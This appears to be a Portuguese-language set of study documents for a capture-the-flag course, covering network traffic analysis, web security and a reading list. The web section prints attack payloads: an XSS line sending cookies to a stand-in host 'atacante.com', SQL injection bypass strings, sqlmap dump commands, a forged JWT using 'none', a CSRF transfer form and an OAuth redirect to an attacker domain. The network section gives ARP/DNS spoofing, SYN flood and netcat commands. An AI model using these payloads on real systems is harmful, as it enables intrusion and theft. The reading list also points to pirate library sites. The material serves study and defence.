# 🌐 Tutorial de Redes e Análise de Tráfego

## O que é Análise de Redes?

Análise de redes é o processo de capturar, inspecionar e interpretar o tráfego de rede para entender comunicações, detectar anomalias, investigar incidentes de segurança e recuperar informações.

## 📌 Conceitos Fundamentais

### 1. Modelo OSI vs TCP/IP

| Camada OSI       | TCP/IP | Protocolos               | Dado      |
|------------ -----|------------|----------------------|-----------|
| 7 - Aplicação    | Aplicação  | HTTP, FTP, SMTP, DNS | Dados     |
| 6 - Apresentação | Aplicação  | SSL/TLS              | Dados     |
| 5 - Sessão       | Aplicação  | NetBIOS              | Dados     |
| 4 - Transporte   | Transporte | TCP, UDP             | Segmentos |
| 3 - Rede         | Internet   | IP, ICMP             | Pacotes   |
| 2 - Enlace       | Enlace     | Ethernet, Wi-Fi      | Quadros   |
| 1 - Física       | Física     | Cabos, Sinais        | Bits      |

```markdown ### 2. Protocolos Principais

**TCP (Transmission Control Protocol)**
- Orientado à conexão
- Confiável (ACK, retransmissão)
- Controle de fluxo
- Portas: 20,21(FTP), 22(SSH), 25(SMTP), 80(HTTP), 443(HTTPS)

**UDP (User Datagram Protocol)**
- Não orientado à conexão
- Não confiável (sem ACK)
- Baixa latência
- Portas: 53(DNS), 67/68(DHCP), 69(TFTP), 123(NTP)

**ICMP (Internet Control Message Protocol)**
- Mensagens de controle e erro
- Ping (echo request/reply)
- Traceroute

### 3. Cabeçalhos de Pacotes

**TCP Header:**
0 1 2 3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Source Port | Destination Port |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Sequence Number |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Acknowledgment Number |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Data | |U|A|P|R|S|F| |
| Offset| Reserved |R|C|S|S|Y|I| Window |
| | |G|K|H|T|N|N| |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Checksum | Urgent Pointer |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

---------------------------------------------------------------------------------------------


## 🛠️ Ferramentas de Análise

### Wireshark (GUI)

# Comandos básicos
wireshark captura.pcap

# Filtros comuns
ip.src == 192.168.1.100
ip.dst == 8.8.8.8
tcp.port == 80
http.request.method == "GET"
tcp contains "flag"
=========================================================================================
tshark (CLI)

# Listar interfaces
tshark -D

# Capturar em tempo real
tshark -i eth0 -c 100

# Analisar arquivo
tshark -r captura.pcap

# Estatísticas
tshark -r captura.pcap -z io,stat,0

# Filtrar e mostrar campos específicos
tshark -r captura.pcap -Y "http" -T fields -e ip.src -e ip.dst -e http.request.uri

# Seguir fluxo TCP
tshark -r captura.pcap -q -z follow,tcp,ascii,0

=========================================================================================
tcpdump (CLI)

# Capturar pacotes
tcpdump -i eth0 -c 100 -w captura.pcap

# Filtrar por porta
tcpdump -i eth0 port 80

# Filtrar por host
tcpdump -i eth0 host 192.168.1.100

# Ler arquivo
tcpdump -r captura.pcap

# Exibir em hex/ascii
tcpdump -r captura.pcap -X

=========================================================================================
tcpflow (Reconstruir fluxos)

# Reconstruir fluxos TCP
tcpflow -r captura.pcap

# Extrair arquivos HTTP
tcpflow -r captura.pcap -e http

=========================================================================================
ncat/netcat

# Servidor simples
nc -lvnp 4444

# Cliente
nc 192.168.1.100 4444

# Transferir arquivo
nc -lvnp 4444 > arquivo_recebido
nc 192.168.1.100 4444 < arquivo_enviar
-------------------------------------------------------------------------------------------
🔍 Técnicas de Análise
1. Filtros no Wireshark
Filtros de captura:

host 192.168.1.100
port 80
tcp
udp
not arp
-------------------------------------------------------------------------------------------
Filtros de exibição:

ip.src == 192.168.1.100
tcp.port == 443
http.request.method == "POST"
tcp.flags.syn == 1
frame contains "flag"

=========================================================================================
2. Seguindo Fluxos TCP
No Wireshark: Clique com direito > Follow > TCP Stream

3. Estatísticas
Protocol Hierarchy: Distribuição de protocolos

Conversations: Conversas entre hosts

Endpoints: Estatísticas por IP

IO Graph: Gráfico de tráfego ao longo do tempo

4. Extraindo Arquivos

# Extrair objetos HTTP
tshark -r captura.pcap --export-objects http,./

# Extrair por assinatura
foremost -i captura.pcap

🧪 Exemplos Práticos
Exemplo 1: Analisar handshake TCP

# Capturar handshake
tcpdump -i eth0 host google.com and tcp port 80 -c 3

# Analisar flags SYN, SYN-ACK, ACK
tshark -r captura.pcap -Y "tcp.flags.syn==1"
-------------------------------------------------------------------------------------------
Exemplo 2: Extrair senha de HTTP POST

# Filtrar POST requests
tshark -r captura.pcap -Y "http.request.method == POST" -V

# Seguir fluxo TCP
tshark -r captura.pcap -q -z follow,tcp,ascii,0
-------------------------------------------------------------------------------------------
Exemplo 3: Detectar exfiltração de dados

# Pacotes grandes ICMP
tshark -r captura.pcap -Y "icmp and data.len > 64"

# Conexões suspeitas
tshark -r captura.pcap -Y "tcp.port == 4444 or tcp.port == 1337"

=========================================================================================
Exemplo 4: Reconstruir conversa

import pyshark

cap = pyshark.FileCapture('captura.pcap')
for packet in cap:
    if hasattr(packet, 'tcp'):
        print(f"TCP: {packet.ip.src}:{packet.tcp.srcport} -> {packet.ip.dst}:{packet.tcp.dstport}")
    if hasattr(packet, 'http'):
        print(f"HTTP: {packet.http.request_method} {packet.http.request_uri}")

=========================================================================================
🎯 Ataques de Rede Comuns

# Ferramentas: arpspoof, ettercap
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

2. SYN Flood

# Ferramentas: hping3
hping3 -S --flood -p 80 192.168.1.100

3. DNS Spoofing

# Ferramentas: dnsspoof
echo "192.168.1.100 google.com" > hosts
dnsspoof -i eth0 -f hosts

4. Man-in-the-Middle (MITM)

# Ferramentas: ettercap, bettercap
ettercap -T -M arp /192.168.1.1// /192.168.1.100//

🔐 Protocolos Criptografados
HTTPS (TLS/SSL)

# Analisar handshake TLS
tshark -r captura.pcap -Y "tls.handshake.type == 1"

# Extrair certificados
tshark -r captura.pcap -Y "tls.handshake.certificate" -V

SSH

# Identificar versão SSH
tshark -r captura.pcap -Y "ssh"

=========================================================================================
```markdown 🧪 Puzzles Relacionados
Puzzle	Técnica de Rede
18	Análise de PCAP
24	Network forensics
32	WiFi hacking
48	Botnet analysis
📊 Comandos Úteis em Rede
No Linux

# Informações de rede
ifconfig
ip a
netstat -tulpn
ss -tulpn

# Testes de conectividade
ping google.com
traceroute google.com
mtr google.com

# Consultas DNS
nslookup google.com
dig google.com
host google.com

# Scanner de portas
nmap -p 1-1000 192.168.1.1
nc -zv 192.168.1.1 1-1000

--------------------------------------------------------------------------------------
No Windows

# Informações
ipconfig /all
netstat -an
route print

# Testes
ping google.com
tracert google.com
pathping google.com

# DNS
nslookup google.com

=========================================================================================
📚 Exercícios Práticos
Básico: Capture seu próprio tráfego HTTP e filtre por GET requests

Intermediário: Analise um PCAP e encontre uma senha em texto claro

Avançado: Reconstrua um arquivo transferido via FTP de um PCAP

📖 Referências

Wireshark User Guide        <== https://www.wireshark.org/docs/wsug_html_chunked/

TCP/IP Guide                <== http://www.tcpipguide.com/

Nmap Network Scanning       <== https://nmap.org/book/toc.html

PacketLife Captures         <== https://packetlife.net/captures/

=========================================================================================
"Na rede, todo pacote conta uma história." 🌐


## 📝 docs/tutoriais/web-security.md

```markdown
# 🌍 Tutorial de Segurança Web

## O que é Segurança Web?

Segurança web é o estudo e prática de proteger sites, aplicações web e serviços online contra ataques, vulnerabilidades e acessos não autorizados. Envolve entender como atacantes exploram falhas e como preveni-las.

## 📌 Principais Vulnerabilidades (OWASP Top 10)

### 1. Injection (SQL, NoSQL, OS)
Injeção de código malicioso em consultas.

### 2. Broken Authentication
Falhas em mecanismos de autenticação e sessão.

### 3. Sensitive Data Exposure
Exposição de dados sensíveis.

### 4. XML External Entities (XXE)
Ataques envolvendo processamento de XML.

### 5. Broken Access Control
Falhas no controle de acesso.

### 6. Security Misconfiguration
Configurações inseguras.

### 7. Cross-Site Scripting (XSS)
Injeção de scripts no lado do cliente.

### 8. Insecure Deserialization
Desserialização insegura de dados.

### 9. Using Components with Known Vulnerabilities
Uso de componentes vulneráveis.

### 10. Insufficient Logging & Monitoring
Logging e monitoramento insuficientes.

## 🔍 SQL Injection (SQLi)

### O que é?
Injeção de comandos SQL em entradas de usuário.

### Exemplos:
```sql
-- Login bypass
' OR '1'='1' --

-- Extrair dados
' UNION SELECT username, password FROM users --

-- Comentar o resto da query
admin' --

Testes Manuais:

'
''
'
'--
'#
' OR '1'='1
' OR 1=1 --
" OR "1"="1
admin' --

Ferramentas:

# SQLMap
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D database --tables
sqlmap -u "http://site.com/page?id=1" -D database -T users --dump

# Havaij
python havij.py

Prevenção:

# Python com parametrização
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# PHP com prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);

=========================================================================================
Cross-Site Scripting (XSS)

Tipos de XSS:
Refletido: Injetado na URL, executado imediatamente

Armazenado: Persistente no banco de dados

DOM-based: No lado do cliente (JavaScript)

Payloads:

<!-- Alerta básico -->
<script>alert('XSS')</script>

<!-- Roubar cookie -->
<script>fetch('http://atacante.com?cookie='+document.cookie)</script>

<!-- Redirecionar -->
<script>window.location='http://atacante.com'</script>

<!-- Imagem com erro -->
<img src=x onerror=alert('XSS')>

<!-- Iframe -->
<iframe src="javascript:alert('XSS')">

<!-- Evento -->
<body onload=alert('XSS')>
----------------------------------------------------------------------------------------

Ferramentas:

# XSSer
xsser --url "http://site.com/search?q=test"

# Burp Suite
# Intruder com payloads XSS

Prevenção:

// Escapar saída
function escapeHTML(str) {
    return str.replace(/[&<>"]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        if (m === '"') return '&quot;';
        return m;
    });
}

// CSP (Content Security Policy)
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">


=========================================================================================
🔍 Cross-Site Request Forgery (CSRF)
O que é?
Forjar requisições em nome de usuários autenticados.

Exemplo:

<!-- Formulário malicioso -->
<form action="http://site.com/transferir" method="POST" id="csrf">
    <input type="hidden" name="conta" value="123456">
    <input type="hidden" name="valor" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>

Prevenção:

<!-- Token CSRF -->
<input type="hidden" name="csrf_token" value="token_único">

<!-- SameSite cookies -->
Set-Cookie: session=123; SameSite=Strict

<!-- Verificar origem -->
if (req.headers.origin !== 'https://site.com') {
    return 403;
}

=========================================================================================
🔍 JWT (JSON Web Tokens)

Estrutura:

header.payload.signature

Exemplo:

// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "user": "admin",
  "role": "admin",
  "iat": 1516239022
}

----------------------------------------------------------------------------------------
Ataques:

import jwt

# Ataque de algoritmo none
token_none = jwt.encode({"user": "admin"}, algorithm="none")

# Força bruta de chave
# hashcat -m 16500 jwt.txt wordlist.txt

# KID injection
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../dev/null"
}

Ferramentas:
jwt.io           <== https://jwt.io/

jwt_tool

Burp Suite extension

🔍 IDOR (Insecure Direct Object References)
O que é?
Acessar objetos diretamente sem autorização.

Exemplo:

GET /api/user/1  # Próprio usuário
GET /api/user/2  # Usuário de outro (se funcionar, é IDOR)

Testes:

/api/user/1
/api/user/2
/api/user/3
/api/user/999

🔍 OAuth Bypass
Vulnerabilidades comuns:
State parameter não validado

Redirect URI aberto

CSRF na autorização

Exemplo de bypass:

GET /oauth/authorize?
    client_id=app&
    redirect_uri=https://atacante.com&
    response_type=code&
    state=123

    🛠️ Ferramentas para Web Hacking

    Burp Suite

    # Proxy
# Interceptar requisições
# Repeater (repetir requisições)
# Intruder (força bruta)
# Scanner (automático)

OWASP ZAP

# Similar ao Burp, gratuito
zap.sh

SQLMap

sqlmap -u "http://site.com/page?id=1" --batch --dbs

Dirb / GoBuster

# Descobrir diretórios
dirb http://site.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://site.com -w wordlist.txt

Nikto

# Scanner de vulnerabilidades
nikto -h http://site.com

Metasploit

msfconsole
use auxiliary/scanner/http/wordpress_login_enum

🧪 Laboratórios Práticos
DVWA (Damn Vulnerable Web Application)

docker run --rm -it -p 80:80 vulnerables/web-dvwa

WebGoat

docker run --rm -it -p 8080:8080 webgoat/goatandwolf

bwapp

docker run --rm -it -p 80:80 raesene/bwapp

🎯 Puzzles Relacionados
Puzzle	Técnica Web
34	Web vulnerabilities
35	SQL injection lab
36	XSS challenge
37	CSRF attack
38	JWT tokens
39	OAuth bypass
40	API security
📊 Checklist de Segurança
Antes de Publicar:
Validar todas as entradas

Escapar saídas (XSS prevention)

Usar prepared statements (SQLi prevention)

Implementar CSRF tokens

Configurar CORS corretamente

Usar HTTPS

Secure cookies (HttpOnly, Secure, SameSite)

Rate limiting

Logging adequado

Headers de segurança (CSP, HSTS, X-Frame-Options)

Headers de Segurança:

Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer

📚 Exercícios
Básico: Explore o DVWA e faça um SQL injection básico

Intermediário: Capture um cookie com XSS refletido

Avançado: Forje um JWT com algoritmo none para acessar /admin

📖 Referências
OWASP Top 10                      <== https://owasp.org/www-project-top-ten/

PortSwigger Web Security Academy  <== https://portswigger.net/web-security

OWASP Cheat Sheets                <== https://cheatsheetseries.owasp.org/

HackerOne Reports                 <== https://hackerone.com/hacktivity

"A segurança não é um produto, é um processo." 🔒


Agora vamos finalizar com **docs/referencias/** (4 arquivos):

## 📝 docs/referencias/livros.md

```markdown
# 📚 Livros Recomendados

## 🔐 Criptografia

### 1. "Cryptography Engineering" - Niels Ferguson, Bruce Schneier
**Nível:** Intermediário/Avançado
**Descrição:** Aborda design e implementação de sistemas criptográficos.
**Tópicos:** AES, RSA, protocolos, implementação segura

### 2. "The Code Book" - Simon Singh
**Nível:** Iniciante
**Descrição:** História da criptografia de forma acessível e fascinante.
**Tópicos:** Cifras históricas, Enigma, criptografia moderna

### 3. "Practical Cryptography" - Niels Ferguson, Bruce Schneier
**Nível:** Intermediário
**Descrição:** Implementação prática de algoritmos criptográficos.
**Tópicos:** AES, RSA, implementação em C

## 🔍 Forense Digital

### 4. "File System Forensic Analysis" - Brian Carrier
**Nível:** Avançado
**Descrição:** Análise profunda de sistemas de arquivos para forense.
**Tópicos:** NTFS, ext4, FAT, recuperação de dados

### 5. "The Art of Memory Forensics" - Michael Hale Ligh
**Nível:** Avançado
**Descrição:** Análise de memória RAM com Volatility.
**Tópicos:** Volatility, malware analysis, dump de memória

### 6. "Practical Forensic Imaging" - Bruce Nikkel
**Nível:** Intermediário
**Descrição:** Aquisição e análise de imagens de disco.
**Tópicos:** Imagens forenses, cadeia de custódia, ferramentas

## 🌐 Redes e Segurança

### 7. "Practical Packet Analysis" - Chris Sanders
**Nível:** Iniciante/Intermediário
**Descrição:** Análise de tráfego de rede com Wireshark.
**Tópicos:** Wireshark, TCP/IP, detecção de ataques

### 8. "The Web Application Hacker's Handbook" - Dafydd Stuttard
**Nível:** Intermediário/Avançado
**Descrição:** Técnicas de hacking de aplicações web.
**Tópicos:** SQLi, XSS, CSRF, Burp Suite

### 9. "Penetration Testing" - Georgia Weidman
**Nível:** Iniciante/Intermediário
**Descrição:** Introdução ao pentest com abordagem prática.
**Tópicos:** Metasploit, Kali Linux, exploração

## 🕵️ OSINT

### 10. "Open Source Intelligence Techniques" - Michael Bazzell
**Nível:** Intermediário
**Descrição:** Técnicas de inteligência de fontes abertas.
**Tópicos:** Busca avançada, redes sociais, dark web

## 🐧 Linux e Sistemas

### 11. "The Linux Command Line" - William Shotts
**Nível:** Iniciante
**Descrição:** Domínio do terminal Linux.
**Tópicos:** Comandos, scripts, administração

### 12. "How Linux Works" - Brian Ward
**Nível:** Intermediário
**Descrição:** Funcionamento interno do Linux.
**Tópicos:** Kernel, processos, sistema de arquivos

## 🎯 CTF e Desafios

### 13. "The CTF Handbook" - CTF Field Guide
**Nível:** Iniciante/Avançado
**Descrição:** Guia completo para competições CTF.
**Tópicos:** Todas as categorias, estratégias, ferramentas

### 14. "Hacking: The Art of Exploitation" - Jon Erickson
**Nível:** Intermediário/Avançado
**Descrição:** Técnicas de exploração de software.
**Tópicos:** Buffer overflow, shellcode, assembly

## 📖 Em Português

### 15. "Introdução ao Hacking" - Diego Macêdo
**Nível:** Iniciante
**Descrição:** Conceitos básicos de segurança ofensiva.

### 16. "Pentest em Aplicações Web" - Daniel Moreno
**Nível:** Intermediário
**Descrição:** Testes de invasão em aplicações web.

### 17. "Forense Computacional" - Antonio Montes
**Nível:** Intermediário
**Descrição:** Fundamentos da perícia digital.

## 📚 Onde Encontrar

### Sites para Download Legal
- [O'Reilly](https://www.oreilly.com/) - Livros técnicos
- [No Starch Press](https://nostarch.com/) - Segurança e programação
- [Leanpub](https://leanpub.com/) - Livros em andamento
- [OpenLibra](https://openlibra.com/) - Livros gratuitos (espanhol)

### Bibliotecas Digitais
- [Z-Library](https://z-lib.org/) - Acervo gigantesco
- [Library Genesis](https://libgen.is/) - Artigos e livros
- [Internet Archive](https://archive.org/) - Acervo histórico

### Repositórios GitHub
- [EbookFoundation/free-programming-books](https://github.com/EbookFoundation/free-programming-books)
- [imthenachoman/How-To-Secure-A-Linux-Server](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server)

---

> *"Um livro é um presente que você pode abrir várias vezes."* 📚



